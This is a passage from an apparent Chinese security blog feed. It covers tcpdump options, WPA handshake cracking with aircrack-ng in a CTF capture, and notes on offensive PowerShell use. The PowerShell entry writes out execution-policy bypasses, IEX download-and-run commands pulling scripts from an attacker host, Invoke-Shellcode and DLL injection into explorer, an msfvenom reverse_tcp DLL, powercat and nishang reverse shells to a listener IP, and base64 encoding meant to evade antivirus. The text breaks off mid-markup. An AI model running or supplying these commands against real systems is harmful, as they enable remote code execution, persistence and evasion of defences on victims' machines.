class="string">&#x27;&#x27;</span> 或者 ``tcpdump  -l   &gt; dat  &amp;  tail  -f  dat<span class="string">&#x27;&#x27;</span>.</span><br><span class="line">    (nt: 前者使用tee来把tcpdump 的输出同时放到文件dat和标准输出中, 而后者通过重定向操作<span class="string">&#x27;&gt;&#x27;</span>, 把tcpdump的输出放到</span><br><span class="line">    dat 文件中, 同时通过tail把dat文件中的内容放到标准输出中)</span><br><span class="line">-L  列出指定网络接口所支持的数据链路层的类型后退出.(nt: 指定接口通过-i 来指定)</span><br><span class="line">-m  module</span><br><span class="line">    通过module 指定的file 装载SMI MIB 模块(nt: SMI，Structure of Management Information, 管理信息结构</span><br><span class="line">    MIB, Management Information Base, 管理信息库. 可理解为, 这两者用于SNMP(Simple Network Management Protoco)</span><br><span class="line">    协议数据包的抓取. 具体SNMP 的工作原理未知, 另需补充).</span><br><span class="line">    此选项可多次使用, 从而为tcpdump 装载不同的MIB 模块.</span><br><span class="line">-M  secret</span><br><span class="line">    如果TCP 数据包(TCP segments)有TCP-MD5选项(在RFC <span class="number">2385</span>有相关描述), 则为其摘要的验证指定一个公共的密钥secret.</span><br><span class="line">-n  不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.</span><br><span class="line">-N  不打印出host 的域名部分. 比如, 如果设置了此选现, tcpdump 将会打印<span class="string">&#x27;nic&#x27;</span> 而不是 <span class="string">&#x27;nic.ddn.mil&#x27;</span>.</span><br><span class="line">-O  不启用进行包匹配时所用的优化代码. 当怀疑某些bug是由优化代码引起的, 此选项将很有用.</span><br><span class="line">-p  一般情况下, 把网络接口设置为非<span class="string">&#x27;混杂&#x27;</span>模式. 但必须注意 , 在特殊情况下此网络接口还是会以<span class="string">&#x27;混杂&#x27;</span>模式来工作； 从而, <span class="string">&#x27;-p&#x27;</span> 的设与不设,</span><br><span class="line">    不能当做以下选现的代名词:</span><br><span class="line">    <span class="string">&#x27;ether host &#123;local-hw-add&#125;&#x27;</span> 或  <span class="string">&#x27;ether broadcast&#x27;</span>(nt: 前者表示只匹配以太网地址为host 的包, 后者表示匹配以太网地址为广播地址的数据包).</span><br><span class="line">-q  快速(也许用&#x27;安静&#x27;更好?)打印输出. 即打印很少的协议相关信息, 从而输出行都比较简短.</span><br><span class="line">-R  设定tcpdump 对 ESP/AH 数据包的解析按照 RFC1825而不是RFC1829(nt: AH, 认证头, ESP， 安全负载封装,</span><br><span class="line">    这两者会用在IP包的安全传输机制中). 如果此选项被设置, tcpdump 将不会打印出<span class="string">&#x27;禁止中继&#x27;</span>域(nt: relay prevention field). 另外,</span><br><span class="line">     由于ESP/AH规范中没有规定ESP/AH数据包必须拥有协议版本号域,</span><br><span class="line">    所以tcpdump不能从收到的ESP/AH数据包中推导出协议版本号.</span><br><span class="line">-r  file</span><br><span class="line">    从文件file 中读取包数据. 如果file 字段为 <span class="string">&#x27;-&#x27;</span> 符号, 则tcpdump 会从标准输入中读取包数据.</span><br><span class="line">-S  打印TCP 数据包的顺序号时, 使用绝对的顺序号, 而不是相对的顺序号.(nt: 相对顺序号可理解为, 相对第一个TCP 包顺序号的差距,</span><br><span class="line">    比如, 接受方收到第一个数据包的绝对顺序号为<span class="number">232323</span>, 对于后来接收到的第<span class="number">2</span>个,第<span class="number">3</span>个数据包, tcpdump会打印其序列号为<span class="number">1</span>, <span class="number">2</span>分别</span><br><span class="line">    表示与第一个数据包的差距为<span class="number">1</span> 和 <span class="number">2.</span> 而如果此时-S 选项被设置, 对于后来接收到的第<span class="number">2</span>个, 第<span class="number">3</span>个数据包会打印出其绝对顺序号:</span><br><span class="line">    <span class="number">232324</span>, <span class="number">232325</span>).</span><br><span class="line">-s  snaplen</span><br><span class="line">    设置tcpdump的数据包抓取长度为snaplen, 如果不设置默认将会是<span class="number">68</span>字节(而支持网络接口分接头(nt: NIT, 上文已有描述,</span><br><span class="line">    可搜索<span class="string">&#x27;网络接口分接头&#x27;</span>关键字找到那里)的SunOS系列操作系统中默认的也是最小值是<span class="number">96</span>).</span><br><span class="line">    <span class="number">68</span>字节对于IP, ICMP(nt: Internet Control Message Protocol,</span><br><span class="line">    因特网控制报文协议), TCP 以及 UDP 协议的报文已足够, 但对于名称服务(nt: 可理解为dns, nis等服务), NFS服务相关的</span><br><span class="line">    数据包会产生包截短. 如果产生包截短这种情况, tcpdump的相应打印输出行中会出现<span class="string">&#x27;&#x27;</span>[|proto]<span class="string">&#x27;&#x27;</span>的标志（proto 实际会显示为</span><br><span class="line">    被截短的数据包的相关协议层次). 需要注意的是, 采用长的抓取长度(nt: snaplen比较大), 会增加包的处理时间, 并且会减少</span><br><span class="line">    tcpdump 可缓存的数据包的数量， 从而会导致数据包的丢失. 所以, 在能抓取我们想要的包的前提下, 抓取长度越小越好.</span><br><span class="line">    把snaplen 设置为<span class="number">0</span> 意味着让tcpdump自动选择合适的长度来抓取数据包.</span><br><span class="line">-T  type</span><br><span class="line">    强制tcpdump按type指定的协议所描述的包结构来分析收到的数据包.  目前已知的type 可取的协议为:</span><br><span class="line">    aodv (Ad-hoc On-demand Distance Vector protocol, 按需距离向量路由协议, 在Ad hoc(点对点模式)网络中使用),</span><br><span class="line">    cnfp (Cisco  NetFlow  protocol),  rpc(Remote Procedure Call), rtp (Real-Time Applications protocol),</span><br><span class="line">    rtcp (Real-Time Applications con-trol protocol), snmp (Simple Network Management Protocol),</span><br><span class="line">    tftp (Trivial File Transfer Protocol, 碎文件协议), vat (Visual Audio Tool, 可用于在internet 上进行电</span><br><span class="line">    视电话会议的应用层协议), 以及wb (distributed White Board, 可用于网络会议的应用层协议).</span><br><span class="line">-t     在每行输出中不打印时间戳</span><br><span class="line">-tt    不对每行输出的时间进行格式处理(nt: 这种格式一眼可能看不出其含义, 如时间戳打印成<span class="number">1261798315</span>)</span><br><span class="line">-ttt   tcpdump 输出时, 每两行打印之间会延迟一个段时间(以毫秒为单位)</span><br><span class="line">-tttt  在每行打印的时间戳之前添加日期的打印</span><br><span class="line">-u     打印出未加密的NFS 句柄(nt: handle可理解为NFS 中使用的文件句柄, 这将包括文件夹和文件夹中的文件)</span><br><span class="line">-U    使得当tcpdump在使用-w 选项时, 其文件写入与包的保存同步.(nt: 即, 当每个数据包被保存时, 它将及时被写入文件中,</span><br><span class="line">      而不是等文件的输出缓冲已满时才真正写入此文件)</span><br><span class="line">       -U 标志在老版本的libcap库(nt: tcpdump 所依赖的报文捕获库)上不起作用, 因为其中缺乏pcap_cump_flush()函数.</span><br><span class="line">-v    当分析和打印的时候, 产生详细的输出. 比如, 包的生存时间, 标识, 总长度以及IP包的一些选项. 这也会打开一些附加的包完整性</span><br><span class="line">      检测, 比如对IP或ICMP包头部的校验和.</span><br><span class="line">-vv   产生比-v更详细的输出. 比如, NFS回应包中的附加域将会被打印, SMB数据包也会被完全解码.</span><br><span class="line">-vvv  产生比-vv更详细的输出. 比如, telent 时所使用的SB, SE 选项将会被打印, 如果telnet同时使用的是图形界面,</span><br><span class="line">      其相应的图形选项将会以<span class="number">16</span>进制的方式打印出来(nt: telnet 的SB,SE选项含义未知, 另需补充).</span><br><span class="line">-w    把包数据直接写入文件而不进行分析和打印输出. 这些包数据可在随后通过-r 选项来重新读入并进行分析和打印.</span><br><span class="line">-W    filecount</span><br><span class="line">      此选项与-C 选项配合使用, 这将限制可打开的文件数目, 并且当文件数据超过这里设置的限制时, 依次循环替代之前的文件, 这相当</span><br><span class="line">      于一个拥有filecount 个文件的文件缓冲池. 同时, 该选项会使得每个文件名的开头会出现足够多并用来占位的<span class="number">0</span>, 这可以方便这些</span><br><span class="line">      文件被正确的排序.</span><br><span class="line">-x    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制打印出每个包的数据(但不包括连接层的头部).</span><br><span class="line">      总共打印的数据大小不会超过整个数据包的大小与snaplen 中的最小值. 必须要注意的是, 如果高层协议数据没有snaplen 这么长,</span><br><span class="line">      并且数据链路层(比如, Ethernet层)有填充数据, 则这些填充数据也会被打印.(nt: so <span class="keyword">for</span> link  layers  that</span><br><span class="line">      pad, 未能衔接理解和翻译, 需补充 )</span><br><span class="line">-xx   tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制打印出每个包的数据, 其中包括数据链路层的头部.</span><br><span class="line">-X    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制和ASCII码形式打印出每个包的数据(但不包括连接层的头部).</span><br><span class="line">      这对于分析一些新协议的数据包很方便.</span><br><span class="line">-XX   当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制和ASCII码形式打印出每个包的数据, 其中包括数据链路层的头部.</span><br><span class="line">      这对于分析一些新协议的数据包很方便.</span><br><span class="line">-y    datalinktype</span><br><span class="line">      设置tcpdump 只捕获数据链路层协议类型是datalinktype的数据包</span><br><span class="line">-Z    user</span><br><span class="line">      使tcpdump 放弃自己的超级权限(如果以root用户启动tcpdump, tcpdump将会有超级用户权限), 并把当前tcpdump的</span><br><span class="line">      用户ID设置为user, 组ID设置为user首要所属组的ID(nt: tcpdump 此处可理解为tcpdump 运行之后对应的进程)</span><br><span class="line">      此选项也可在编译的时候被设置为默认打开.(nt: 此时user 的取值未知, 需补充)</span><br></pre></td></tr></table></figure><h2 id="Tcpdump常用命令实例"><a href="#Tcpdump常用命令实例" class="headerlink" title="Tcpdump常用命令实例"></a>Tcpdump常用命令实例</h2><ul><li>不可见的图层</li><li>Adobe的元数据格式‘XMP’</li><li>Adobe的XMP元数据</li><li>PDF的‘增量生成’功能允许保留用户不可见的前版本信息</li><li>白色的文字或背景图</li><li>图片背后的文字信息</li><li>图层后面被覆盖的另一个图层</li><li>不显示的注释层。</li></ul><h2 id="Wifi破解"><a href="#Wifi破解" class="headerlink" title="Wifi破解"></a>Wifi破解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng ctf.pcap -w /usr/share/wordlists/rockyou.txt</span><br><span class="line">airdecap-ng ctf.pcap -e ctf -p password1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ aircrack-ng -w passwd.txt shipin.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line">   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)</span><br><span class="line">Choosing first network as target.</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">                               Aircrack-ng 1.6 </span><br><span class="line"></span><br><span class="line">      [00:00:00] 1&#x2F;1 keys tested (37.17 k&#x2F;s) </span><br><span class="line"></span><br><span class="line">      Time left: --</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ 88888888 ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : B4 30 38 0F 24 7B 57 AC DE B5 3A 7F 2E FE 6B 45 </span><br><span class="line">                       0B 34 02 C3 89 F9 69 D5 B7 35 87 1B FB 4C EE 7F </span><br><span class="line"></span><br><span class="line">      Transient Key  : 17 AE 23 D0 69 7C 0D 45 2B 40 F6 7D 06 C9 C5 6F </span><br><span class="line">                       25 F0 B0 48 7A 6C 22 7C E2 73 50 71 46 FE 5D 0C </span><br><span class="line">                       8F 59 01 BE 66 56 DF 1E 58 DD 34 DB BF A7 2D FD </span><br><span class="line">                       2C 53 11 7F B2 E5 F0 16 7F 57 F5 6A 04 36 F5 71 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 75 19 C5 F3 3E 33 58 23 CA 4B A1 85 FB 46 C0 2A </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ aircrack-ng &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">#注意ESSID</span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">Please specify a dictionary (option -w).</span><br></pre></td></tr></table></figure><p><code>-e</code>后面的为<code>ESSID</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ airdecap-ng -e <span class="number">0719</span> -p <span class="number">88888888</span> shipin.cap</span><br><span class="line">Total number of stations seen            <span class="number">6</span></span><br><span class="line">Total number of packets read         <span class="number">16664</span></span><br><span class="line">Total number of WEP data packets         <span class="number">0</span></span><br><span class="line">Total number of WPA data packets        <span class="number">27</span></span><br><span class="line">Number of plaintext data packets         <span class="number">0</span></span><br><span class="line">Number of decrypted WEP  packets         <span class="number">0</span></span><br><span class="line">Number of corrupted WEP  packets         <span class="number">0</span></span><br><span class="line">Number of decrypted WPA  packets        <span class="number">16</span></span><br><span class="line">Number of bad TKIP (WPA) packets         <span class="number">0</span></span><br><span class="line">Number of bad CCMP (WPA) packets         <span class="number">0</span></span><br></pre></td></tr></table></figure><p>之后会解出来一个压缩包。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Wireshark&quot;&gt;&lt;a href=&quot;#Wireshark&quot; class=&quot;headerlink&quot; title=&quot;Wireshark&quot;&gt;&lt;/a&gt;Wireshark&lt;/h1&gt;&lt;h2 id=&quot;文件导出功能&quot;&gt;&lt;a href=&quot;#文件导出功能&quot; class=&quot;head</summary>
      
    
    
    
    <category term="CTF-流量分析" scheme="http://s1eady.top/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CTF-流量分析" scheme="http://s1eady.top/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>内网学习--Powershell使用</title>
    <link href="http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/"/>
    <id>http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/</id>
    <published>2020-11-20T20:14:26.000Z</published>
    <updated>2020-11-21T08:14:57.442Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><h4 id="Powershell基本概念"><a href="#Powershell基本概念" class="headerlink" title="Powershell基本概念"></a>Powershell基本概念</h4><p>Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。</p><h4 id="Powershell特点"><a href="#Powershell特点" class="headerlink" title="Powershell特点"></a>Powershell特点</h4><ul><li>在Windows 7以上版本是默认安装的；</li><li>脚本可以在内存中运行，不需要写入磁盘；</li><li>几乎不会触发杀毒软件；</li><li>可远程执行；</li><li>目前很多工具都是局域PowerShell开发的；</li><li>使Windows脚本的执行更为容易；</li><li>cmd.exe的运行通常会被阻止，但PowerShell的运行通常不会被阻止；</li><li>可用于管理活动目录；</li></ul><h4 id="Powershell执行策略"><a href="#Powershell执行策略" class="headerlink" title="Powershell执行策略"></a>Powershell执行策略</h4><p>为了防止使用者运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能运行”。</p><p>使用如下的cmdlet命令查询当前的执行策略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><h5 id="常见的执行策略值"><a href="#常见的执行策略值" class="headerlink" title="常见的执行策略值"></a>常见的执行策略值</h5><ul><li>Restricted：脚本不能运行（默认设置）；</li><li>RemoteSigned：在本地创建的脚本可以运行，但不能运行网上下载的脚本（拥有数字证书的除外）；</li><li>AllSigned：仅当脚本由受信任的发布者签名时才能运行；</li><li>Unrestricted：允许所有脚本运行；</li></ul><p>使用下面的cmdlet命令设置PowerShell的执行策略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; Set-ExecutionPolicy &lt;policy name&gt;</span><br></pre></td></tr></table></figure><h5 id="绕过执行策略"><a href="#绕过执行策略" class="headerlink" title="绕过执行策略"></a>绕过执行策略</h5><p>PowerSploit是一款基于PowerShell的后渗透测试框架，其中包含很多PowerShell脚本，主要用于渗透测试中的信息收集、权限提升、权限维持。</p><p>想运行PowerShell脚本，必须使用管理员权限将执行策略从Restricted改为Unrestricted。</p><h6 id="Bypass本地权限并执行"><a href="#Bypass本地权限并执行" class="headerlink" title="Bypass本地权限并执行"></a>Bypass本地权限并执行</h6><ul><li><p>将PowerShell脚本文件test.ps1上传至目标服务器。在命令行环境下，执行如下命令，绕过安全策略，在目标服务器本地执行该脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File test.ps1</span><br></pre></td></tr></table></figure></li><li><p>用iex下载远程PS1脚本绕过权限执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(&quot;xxx.ps1&quot;);[Parameters]</span><br></pre></td></tr></table></figure></li></ul><h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h4><h5 id="PowerSploit基本概念"><a href="#PowerSploit基本概念" class="headerlink" title="PowerSploit基本概念"></a>PowerSploit基本概念</h5><p>PowerSploit是GitHub上面的一个安全项目，上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。</p><h5 id="PowerSploit特点"><a href="#PowerSploit特点" class="headerlink" title="PowerSploit特点"></a>PowerSploit特点</h5><p>1.代码运行在内存中可以不去接触磁盘</p><p>2.从另一个系统中下载代码并执行</p><p>3.很多安全产品并不能监测到powershell的活动</p><p>4.cmd.exe通常被阻止运行，但是powershell不会</p><h5 id="PowerSploit下载"><a href="#PowerSploit下载" class="headerlink" title="PowerSploit下载"></a>PowerSploit下载</h5><p>Github下载之后，我们放到攻击机的web目录，以便于在目标机器的powershell中下载对应的利用脚本。</p><h5 id="PowerSploit模块"><a href="#PowerSploit模块" class="headerlink" title="PowerSploit模块"></a>PowerSploit模块</h5><ul><li><p>CodeExecution模块–Invoke-Shellcode脚本</p><p>   直接执行shellcode反弹meterpreter shell</p><ul><li><p>利用msfvenom生成一个反弹木马，以供invoke-shellcode注入。</p></li><li><p>调用目标机的powershell进行IEX远程下载invoke-shellcode脚本和生成的木马。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSp</span><br><span class="line">loit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;)</span><br></pre></td></tr></table></figure></li><li><p>下载生成好的木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;code&quot;)</span><br></pre></td></tr></table></figure></li><li><p>kali设置msf监听</p></li><li><p>在powershell中调用invoke-shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; Invoke-Shellcode -Shellcode $buf -Force</span><br></pre></td></tr></table></figure></li></ul><p>指定进程注入shellcode反弹meterpreter shell</p><ul><li><p>下载ps脚本和木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSp</span><br><span class="line">loit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;)</span><br><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;code&quot;)</span><br></pre></td></tr></table></figure></li><li><p>选择注入的进程—直接选择系统进程，因为如果我们的进程关闭，我们的会话也会关闭，系统进程一般不回被关闭。<br>常见系统进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explorer进程(Windows程序管理器或者文件资源管理器)</span><br></pre></td></tr></table></figure></li><li><p>Get-Process或者ps命令查看当前所有的进程。</p><p><code>ps -Name explorer</code>查看某一个进程的PID。</p></li><li><p>注入id为1228的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Shellcode -Shellcode $buf -ProcessID 1228 -Force调用invoke-dllinjection将DLL注入到进程中。</span><br></pre></td></tr></table></figure></li></ul></li><li><p>CodeExecution模块–调用invoke-dllinjection将DLL注入到进程中</p><ul><li><p>msf生成dll文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.190.141 lport&#x3D;4444 -f dll -o &#x2F;var&#x2F;www&#x2F;html&#x2F;code.dll</span><br></pre></td></tr></table></figure></li><li><p>Powershel 下载dllinjection文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSploit&#x2F;CodeExecutio</span><br><span class="line">n&#x2F;Invoke-DllInjection.ps1&quot;)</span><br></pre></td></tr></table></figure></li><li><p>将dll注入到某一个进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; Invoke-DllInjection -Dll .\code.dll -ProcessID 2700</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="powershell反弹shell常见方式"><a href="#powershell反弹shell常见方式" class="headerlink" title="powershell反弹shell常见方式"></a>powershell反弹shell常见方式</h4><ul><li><p>powercat反弹shell </p><p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat 。</p><ul><li><p>下载脚本文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString (&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);</span><br></pre></td></tr></table></figure></li><li><p>反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.159.134 -p 6666 -e cmd</span><br></pre></td></tr></table></figure></li></ul></li><li><p>nishang反弹shell </p><p>Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p><ul><li><p>反弹TCPshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com &#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666</span><br></pre></td></tr></table></figure></li><li><p>自定义powershell函数反弹shell </p></li><li><p>反弹UDPshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.134&#x2F;nishang&#x2F;Shells&#x2F;Invoke-PowerShellUdp.ps1&#39;); Invoke-PowerShellUdp -Reverse -IPAddress 192.168.159.134 -port 53</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="使用Base64对PowerShell命令进行编码"><a href="#使用Base64对PowerShell命令进行编码" class="headerlink" title="使用Base64对PowerShell命令进行编码"></a>使用Base64对PowerShell命令进行编码</h4><p>使用Base64编码PowerShell命令可以起到混淆和压缩代码的作用，避免一些特殊字符导致脚本被杀毒软件所查杀。</p><p>使用一个Python脚本文件<a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">ps_encoder.py</a>，其使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码。</p><ul><li><p>将payload输入到文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# echo &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;cheetz&#x2F;PowerSploit&#x2F;master&#x2F;CodeExecution&#x2F;Invoke--Shellcode.ps1&#39;); Invoke-Shellcode -Payload windows&#x2F;meterpreter&#x2F;reverse_https -Lhost 192.168.10.137 -Lport 666 -Force&quot; &gt;raw.txt</span><br></pre></td></tr></table></figure></li><li><p>使用脚本对其编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# python ps_encoder.py -s raw.txt</span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop#</span><br></pre></td></tr></table></figure></li><li><p>在目标机器上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 